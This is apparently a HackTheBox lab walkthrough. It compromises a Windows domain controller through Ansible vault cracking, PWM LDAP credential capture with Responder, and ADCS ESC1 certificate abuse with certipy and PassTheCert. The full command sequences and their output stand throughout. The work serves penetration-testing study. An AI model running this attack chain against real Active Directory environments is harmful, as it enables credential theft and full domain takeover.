---
layout: post
title: HackTheBox - Authority
tags:
  - windows
  - "#ansible"
  - "#ldap"
categories: HTB
aliases:
  - ADCS
  - PassTheCert
  - Certipy
---

![placeholder](https://drive.google.com/uc?id=1HzlvZ7lKjQHuI4Yh72-Uqe_Qy9VcZO8M){:style="display:block; margin-left:auto; margin-right:auto"}

## Network Settings

```text
/etc/hosts
10.10.11.222 authority.authority.htb authority.htb authority.htb.corp

/etc/resolv.conf
search authority.authority.htb
nameserver 10.10.11.222
```

## Scan #nmap

```bash
❯ nmap -sC -sV -oA scans/Authority -p- 10.10.11.222
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-05 15:39 WET
Nmap scan report for 10.10.11.222
Host is up (0.054s latency).
Not shown: 65506 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-05 19:40:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-12-05T19:41:58+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-12-05T19:41:58+00:00; +4h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-12-05T19:41:58+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-12-05T19:41:58+00:00; +4h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/https-alt
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-12-03T10:27:47
|_Not valid after:  2025-12-04T22:06:11
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Tue, 05 Dec 2023 19:40:59 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Tue, 05 Dec 2023 19:40:59 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Tue, 05 Dec 2023 19:41:04 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49728/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=12/5%Time=656F448B%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Tue,\x2005\x20De
SF:c\x202023\x2019:40:59\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<
SF:html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Tu
SF:e,\x2005\x20Dec\x202023\x2019:40:59\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Tue,\
SF:x2005\x20Dec\x202023\x2019:40:59\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Tue,\x2005\x20Dec\x202023\x2019:41
SF::04\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Re
SF:port</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| smb2-time: 
|   date: 2023-12-05T19:41:50
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.64 seconds
```
## SMB enumeration #netexec 

```bash
❯ nxc smb authority.htb.corp -u kali -p '' --shares
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\kali: 
SMB         10.10.11.222    445    AUTHORITY        [*] Enumerated shares
SMB         10.10.11.222    445    AUTHORITY        Share           Permissions     Remark
SMB         10.10.11.222    445    AUTHORITY        -----           -----------     ------
SMB         10.10.11.222    445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.10.11.222    445    AUTHORITY        C$                              Default share
SMB         10.10.11.222    445    AUTHORITY        Department Shares                 
SMB         10.10.11.222    445    AUTHORITY        Development     READ            
SMB         10.10.11.222    445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.10.11.222    445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.10.11.222    445    AUTHORITY        SYSVOL                          Logon server share 
```
### Listing contents

```bash
❯ smbclient "//authority.htb.corp/Development"
Password for [WORKGROUP\adok]:
Try "help" to get a list of possible commands.
smb: \Automation\Ansible\> ls
  .                                   D        0  Fri Mar 17 13:20:50 2023
  ..                                  D        0  Fri Mar 17 13:20:50 2023
  ADCS                                D        0  Fri Mar 17 13:20:48 2023
  LDAP                                D        0  Fri Mar 17 13:20:48 2023
  PWM                                 D        0  Fri Mar 17 13:20:48 2023
  SHARE                               D        0  Fri Mar 17 13:20:48 2023

		5888511 blocks of size 4096. 1517625 blocks available
```

## 8443 - [PWM](https://github.com/pwm-project/pwm) - password self-service application for LDAP directories


![placeholder](https://drive.google.com/uc?id=1RbsRv6jDOS2tWc7SSnK5LYFkTv9FsC0g){:style="display:block; margin-left:auto; margin-right:auto"}

* Error message

![placeholder](https://drive.google.com/uc?id=1lRgQCJk-dCbDrcrSkwR3TjsBddS2hVcJ){:style="display:block; margin-left:auto; margin-right:auto"}


```text
Directory unavailable. If this error occurs repeatedly please contact your help desk.  
  

5017 ERROR_DIRECTORY_UNAVAILABLE (all ldap profiles are unreachable; errors: ["error connecting as proxy user: unable to create connection: unable to connect to any configured ldap url, last error: unable to bind to ldaps://authority.authority.htb:636 as CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb reason: CommunicationException (authority.authority.htb:636; PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target)"])
```

## [Ansible Vaults](https://docs.ansible.com/ansible/2.8/user_guide/vault.html)

```bash
❯ smbclient "//authority.htb.corp/Development"
Password for [WORKGROUP\adok]:
Try "help" to get a list of possible commands.
smb: \> cd Automation\Ansible\PWM\
smb: \Automation\Ansible\PWM\> get ansible.cfg 
getting file \Automation\Ansible\PWM\ansible.cfg of size 491 as ansible.cfg (2,4 KiloBytes/sec) (average 2,4 KiloBytes/sec)
smb: \Automation\Ansible\PWM\> cd defaults
smb: \Automation\Ansible\PWM\defaults\> get main.yml 
getting file \Automation\Ansible\PWM\defaults\main.yml of size 1591 as main.yml (9,0 KiloBytes/sec) (average 5,4 KiloBytes/sec)
```

* main.yml

```text

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

### Cracking vaults

```bash
❯ ansible2john pwm_admin_login.yml > pwm_admin_login

❯ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt pwm_admin_login
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])
No password hashes left to crack (see FAQ)
```

```bash
❯ cat pwm_admin_login.yml | ansible-vault decrypt
Vault password: 
Decryption successful
svc_pwm
```

```bash
❯ ansible2john pwm_admin_password.yml > pwm_admin_password

❯ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt pwm_admin_password
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (pwm_admin_password.yml)     
1g 0:00:00:58 DONE (2023-12-05 17:01) 0.01707g/s 679.6p/s 679.6c/s 679.6C/s 001983..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
❯ cat pwm_admin_password.yml | ansible-vault decrypt
Vault password: 
Decryption successful
pWm_@dm!N_!23
```

```bash
❯ ansible2john ldap_admin_password.yml > ldap_admin_password

❯ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ldap_admin_password
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (ldap_admin_password.yml)     
1g 0:00:00:56 DONE (2023-12-05 17:03) 0.01782g/s 709.7p/s 709.7c/s 709.7C/s 001983..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
❯ cat ldap_admin_password.yml | ansible-vault decrypt
Vault password: 
Decryption successful
DevT3st@123
```

## PWM Dashboard


![placeholder](https://drive.google.com/uc?id=1_2sCh84wKzJ3z2gcXyJ39Sn4bbpa-MWg){:style="display:block; margin-left:auto; margin-right:auto"}


## LDAP Password - Method 1 - storePlaintextValues

![placeholder](https://drive.google.com/uc?id=1KTG0ix-M_2VBzGNCgaIDR00i6c6MkzO4){:style="display:block; margin-left:auto; margin-right:auto"}

* Download Configuration file PwmConfiguration.xml

![placeholder](https://drive.google.com/uc?id=10ig0S4M-RmoD6zaQEEvpTqXNkgh5QdIf){:style="display:block; margin-left:auto; margin-right:auto"}

```xml
<?xml version="1.0" encoding="UTF-8"?><PwmConfiguration createTime="2022-08-11T01:46:23Z" modifyTime="2022-08-11T01:46:24Z" pwmBuild="c96802e" pwmVersion="2.0.3" xmlVersion="5">
    <!--
                If you wish for sensitive values in this configuration file to be stored unencrypted, set the property
                "storePlaintextValues" to "true".
-->
    <properties type="config">
        <property key="configIsEditable">true</property>
        <property key="configEpoch">0</property>
        <property key="configPasswordHash">$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua</property>
    </properties>
```

* Add ``` <property key="storePlaintextValues">true</property> ```

```xml
    <properties type="config">
	    <property key="storePlaintextValues">true</property>
        <property key="configIsEditable">true</property>
        <property key="configEpoch">0</property>
        <property key="configPasswordHash">$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua</property>
    </properties>
```

* Upload and restart session

```bash
        <setting key="ldap.proxy.password" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="PASSWORD" syntaxVersion="0">
            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password</label>
            <value>PLAIN:lDaP_1n_th3_cle4r!</value>
        </setting>

```
## LDAP Password - Method 2 - [Responder](https://github.com/lgandx/Responder)

* Change LDAP server to ```ldap://<local_ip_address:389>```

![placeholder](https://drive.google.com/uc?id=1K_PYZcrmpYtc5OgZ1q3UOiS4RHEv4imD){:style="display:block; margin-left:auto; margin-right:auto"}

```bash
❯ sudo ./Responder.py -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.87]
    Responder IPv6             [dead:beef:2::1055]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-DIQSRGPIP2O]
    Responder Domain Name      [JIWU.LOCAL]
    Responder DCE-RPC Port     [49313]

[+] Listening for events...
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.222
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

## Foothold - LDAP Access

```bash
❯ nxc smb authority.htb.corp -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
```

```bash
❯ evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r!
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> dir


    Directory: C:\Users\svc_ldap\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/6/2023   5:30 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> 
```

USER FLAG : 4a1c**********ff65799df1f7706ee9

## ROOT
### Add new computer to domain

```bash
❯ impacket-addcomputer -computer-name 'adokPC$' -computer-pass '1q2w3e' -dc-host authority.htb -domain-netbios AUTHORITY 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account adokPC$ with password 1q2w3e.
```

* Check user with netexec

```bash
❯ nxc smb authority.htb -u 'adokPC$' -p '1q2w3e'
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\adokPC$:1q2w3e 

```

* Group Domain Computers 

```bash
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> net group "domain computers" /domain
Group name     Domain Computers
Comment        All workstations and servers joined to the domain

Members

-------------------------------------------------------------------------------
adokPC$
The command completed successfully.
```

### Find vulnerable certificate

```bash
❯ certipy find -u svc_ldap@authority.htb -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Saved BloodHound data to '20231206084342_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231206084342_Certipy.txt'
[*] Saved JSON output to '20231206084342_Certipy.json'
```

```bash
❯ nxc ldap authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M adcs
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
ADCS        10.10.11.222    389    AUTHORITY        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS                                                Found PKI Enrollment Server: authority.authority.htb
ADCS                                                Found CN: AUTHORITY-CA
```

```bash
❯ certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication


```

* Machine Quota

```bash
❯ nxc ldap authority.htb -u svc_ldap -p lDaP_1n_th3_cle4r! -M maq
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
MAQ         10.10.11.222    389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10
```

### Request Certificate to impersonate the administrator user

```bash
❯ certipy req -username "adokPC$" -p "1q2w3e" -dc-ip 10.10.11.222 -ca AUTHORITY-CA -upn 'administrator@authority.htb' -template CorpVPN -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 3
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```

### Pre-authentication relying on a certificate - [Pass the Certificate](https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate)

* Generate PEM certificate + PEM private key

```bash
❯ certipy cert -pfx administrator.pfx -nokey -out user.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'user.crt'

❯ certipy cert -pfx administrator.pfx -nocert -out user.key
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'user.key'
```

### [PassTheCert.py](https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/README.md)

* Check user

```bash
❯ python3 passthecert.py -crt user.crt -key user.key -dc-ip 10.10.11.222 -domain authority.htb -action whoami
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] You are logged in as: HTB\Administrator
```

* Change administrator password

```bash
❯ python passthecert.py -crt user.crt -key user.key -dc-ip 10.10.11.222 -domain authority.htb -action modify_user -target administrator -new-pass ad0kPwn3d!
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully changed administrator password to: ad0kPwn3d!
```

```bash
❯ evil-winrm -i 10.10.11.222 -u administrator -p ad0kPwn3d!
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```

ROOT FLAG : 8a20069b1c971***********d6c13322
